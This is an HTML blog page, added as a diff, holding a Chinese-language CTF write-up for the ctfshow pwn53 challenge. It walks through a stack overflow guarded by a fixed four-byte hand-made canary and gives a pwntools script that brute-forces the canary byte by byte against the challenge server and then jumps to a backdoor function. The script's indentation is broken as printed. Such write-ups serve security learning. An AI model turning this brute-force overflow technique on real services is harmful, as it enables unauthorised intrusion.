@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="ctfshow-pwn53-类canary爆破  我们先checksec一下：  可以发现，没有开启canary保护，可能是栈溢出，拖入IDA中：  main函数里面执行了这个函数，看来是手动放置了canary，大小为4字节，我们看看接下来的函数:  这个ctfshow函数先是循环读取，每次读取一个字节，直到读取到换行符(ascii:10 0xa)，循环读取才会结束，__isoc99_sscanf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-pwn53">
+<meta property="og:url" content="http://example.com/2024/05/29/ctfshow-pwn53/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="ctfshow-pwn53-类canary爆破  我们先checksec一下：  可以发现，没有开启canary保护，可能是栈溢出，拖入IDA中：  main函数里面执行了这个函数，看来是手动放置了canary，大小为4字节，我们看看接下来的函数:  这个ctfshow函数先是循环读取，每次读取一个字节，直到读取到换行符(ascii:10 0xa)，循环读取才会结束，__isoc99_sscanf">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/05/29/ctfshow-pwn53/1.png">
+<meta property="og:image" content="http://example.com/2024/05/29/ctfshow-pwn53/2.png">
+<meta property="og:image" content="http://example.com/2024/05/29/ctfshow-pwn53/3.png">
+<meta property="og:image" content="http://example.com/2024/05/29/ctfshow-pwn53/4.png">
+<meta property="article:published_time" content="2024-05-29T07:14:36.000Z">
+<meta property="article:modified_time" content="2024-05-29T08:19:32.579Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/05/29/ctfshow-pwn53/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-pwn53</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/05/30/picoctf-2018-buffer-overflow-2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/05/29/ctfshow-pwn52/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/29/ctfshow-pwn53/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/29/ctfshow-pwn53/&text=ctfshow-pwn53"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/29/ctfshow-pwn53/&is_video=false&description=ctfshow-pwn53"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-pwn53&body=Check out this article: http://example.com/2024/05/29/ctfshow-pwn53/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/29/ctfshow-pwn53/&name=ctfshow-pwn53&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/29/ctfshow-pwn53/&t=ctfshow-pwn53"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ctfshow-pwn53-类canary爆破</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ctfshow-pwn53
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-29T07:14:36.000Z" itemprop="datePublished">2024-05-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">ctfshow-pwn53-类canary爆破</h1>
+
+<p>我们先checksec一下：</p>
+<p><img src="/2024/05/29/ctfshow-pwn53/1.png" alt="1"></p>
+<p>可以发现，没有开启canary保护，可能是栈溢出，拖入IDA中：</p>
+<p><img src="/2024/05/29/ctfshow-pwn53/2.png" alt="2"></p>
+<p>main函数里面执行了这个函数，看来是手动放置了canary，大小为4字节，我们看看接下来的函数:</p>
+<p><img src="/2024/05/29/ctfshow-pwn53/3.png" alt="3"></p>
+<p>这个ctfshow函数先是循环读取，每次读取一个字节，直到读取到换行符(ascii:10 0xa)，循环读取才会结束，__isoc99_sscanf(v2,”%d”,&amp;nbytes)这个函数从v2中读取一个整数，存放到nbytes变量中，这个变量决定了我们能够向buf写入的数据大小，我们想要造成溢出，这个数据就得大点，接下来，就去比较s1与我们的global_canary是否相同，相同这个函数才能正常返回，造成溢出，后门函数如下：</p>
+<p><img src="/2024/05/29/ctfshow-pwn53/4.png" alt="4"></p>
+<p>那我们就得去爆破这个global_canary的值了，这个值是静态的，是不变的，因为它起到的是类似canary的效果，所以我们可以反复连接程序，第一次去覆盖global_canary的一个字节，直到爆破出第一个字节所对应的值后，我们再改为覆盖两个字节，去爆破出第二个字节的值，依次类推，直到第四个字节爆破出来，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cannry = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">        sh = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28130</span>)</span><br><span class="line"></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        sh.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x20</span>) + cannry + <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line"></span><br><span class="line">        sh.send(payload)</span><br><span class="line"></span><br><span class="line">        data = sh.recv()</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;data:&quot;</span> + data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Where is the flag?&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">        cannry += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">	    <span class="built_in">print</span>(<span class="string">&quot;sucess!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">	    <span class="built_in">print</span>(cannry)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">	    <span class="built_in">print</span>(<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"></span><br><span class="line">	    sh.close()</span><br><span class="line"></span><br><span class="line">	    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cannry------------------&gt;:&#x27;</span>+cannry)</span><br><span class="line"></span><br><span class="line">sh =  remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28130</span>)</span><br><span class="line"></span><br><span class="line">flag_address = <span class="number">0x8048696</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x20</span>) + cannry + <span class="string">&quot;A&quot;</span>*(<span class="number">0x10</span>) + p32(flag_address)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">            </span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ctfshow-pwn53-类canary爆破</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/29/ctfshow-pwn53/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/29/ctfshow-pwn53/&text=ctfshow-pwn53"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/29/ctfshow-pwn53/&is_video=false&description=ctfshow-pwn53"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-pwn53&body=Check out this article: http://example.com/2024/05/29/ctfshow-pwn53/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/29/ctfshow-pwn53/&title=ctfshow-pwn53"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/29/ctfshow-pwn53/&name=ctfshow-pwn53&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/29/ctfshow-pwn53/&t=ctfshow-pwn53"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
